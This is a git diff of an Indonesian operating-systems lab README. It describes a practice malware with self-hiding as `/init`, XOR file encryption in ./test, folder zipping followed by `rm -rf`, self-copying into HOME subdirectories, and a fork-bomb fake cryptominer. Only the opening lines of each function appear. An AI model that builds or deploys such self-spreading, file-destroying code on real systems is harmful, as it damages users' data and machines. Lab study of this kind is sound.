@@ -463,7 +463,7 @@ void shutdown_daemon() {
 ## Soal_3
 ### A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi `/init`.
 
-```
+```c
 void daemonize() {
     pid_t pid = fork();
     if (pid > 0) exit(0);     // Parent process keluar
@@ -488,7 +488,7 @@ void daemonize() {
 ### B. Mengimplementasikan fitur wannacryptor yang bertugas untuk melakukan enkripsi pada seluruh file dan folder yang terdapat di direktori target (./test), dengan menggunakan metode XOR berdasarkan timestamp saat program dijalankan.
 Untuk kelompok genap, enkripsi folder dilakukan dengan mengubah folder dan isinya menjadi file `.zip`, kemudian file `.zip` tersebut dienkripsi menggunakan XOR dan folder asli akan dihapus.
 
-```
+```c
 void xor_encrypt(const char *path) {
     FILE *f = fopen(path, "rb+");
     if (!f) return;
@@ -513,7 +513,7 @@ void xor_encrypt(const char *path) {
 ```
 menggunakan metode XOR sederhana untuk mengenkripsi file. Kunci enkripsi didasarkan pada timestamp saat program dijalankan, sehingga hasil enkripsinya berbeda setiap kali program dijalankan.
 
-```
+```c
 void zip_and_encrypt(const char *folder_path) {
     char zip_cmd[8192];
     snprintf(zip_cmd, sizeof(zip_cmd), "zip -r -q '%s.zip' '%s' && rm -rf '%s'", folder_path, folder_path, folder_path);
@@ -526,7 +526,7 @@ void zip_and_encrypt(const char *folder_path) {
 ```
 Folder dikompresi menjadi `.zip`, lalu hasil file `.zip` akan dienkripsi. Folder aslinya kemudian dihapus secara permanen.
 
-```
+```c
 void wannacryptor(const char *target) {
     DIR *dir = opendir(target);
     if (!dir) return;
@@ -552,7 +552,7 @@ void wannacryptor(const char *target) {
 ```
 Program memindai semua isi direktori target (./test). Bila menemukan folder, dilakukan zip + enkripsi. Bila menemukan file biasa, langsung dienkripsi.
 
-```
+```c
 void *loop_crypto(void *arg) {
     while (1) {
         wannacryptor(FOLDER_TARGET);
@@ -605,7 +605,7 @@ Fungsi `replicate_malware` akan:
 - Membuka semua subdirektori di dalam folder HOME
 - Untuk setiap subdirektori, membuat salinan file ./runme (yaitu binary malware ini sendiri) ke dalam subfolder tersebut
 
-```
+```c
 void *loop_replicate(void *arg) {
     while (1) {
         replicate_malware();
@@ -615,7 +615,7 @@ void *loop_replicate(void *arg) {
 ```
 Agar malware terus menyebar, proses ini dijalankan dalam thread yang mengulang setiap 30 detik.
 
-```
+```c
 void start_trojan() {
     prctl(PR_SET_NAME, "trojan.wrm");  // Nama proses
     pthread_t t;
@@ -625,14 +625,10 @@ void start_trojan() {
 ```
 Thread `loop_replicate` akan dijalankan oleh proses anak yang dinamai `trojan.wrm`.
 
-Output:
-
-
-![runme](assets/trojan.png)
 
 ### D. Fitur ketiga bernama rodok.exe dirancang untuk menjalankan fork bomb, yaitu proses yang akan membuat banyak proses anak secara terus-menerus. Namun berbeda dari fork bomb biasa, setiap proses yang dibuat oleh rodok.exe berperan sebagai cryptominer palsu yang secara berkala menulis hash acak ke dalam log file.
 
-```
+```c
 void start_rodok() {
     prctl(PR_SET_NAME, "rodok.exe");
     for (int i = 0; i < MAX_MINER; i++) {
@@ -651,7 +647,7 @@ void start_rodok() {
 ```
 Proses rodok.exe akan membuat 4 child process (jumlah ditentukan dengan MAX_MINER). Masing-masing proses akan menjalankan thread `mine_crafter`.
 
-```
+```c
 void *mine_crafter(void *arg) {
     int id = *(int *)arg;
     char name[32];
@@ -679,11 +675,6 @@ void *mine_crafter(void *arg) {
 - Setiap proses `mine-crafter-<id>` akan menghasilkan hash acak sepanjang 64 karakter hex.
 - Hasil hash akan disimpan di file log tersembunyi: `/tmp/.miner.log`.
 - Setiap hash dicatat bersamaan dengan timestamp dan ID proses miner.
-
-Output:
-
-
-![miner.log](assets/miner.log.png)
     
 
 
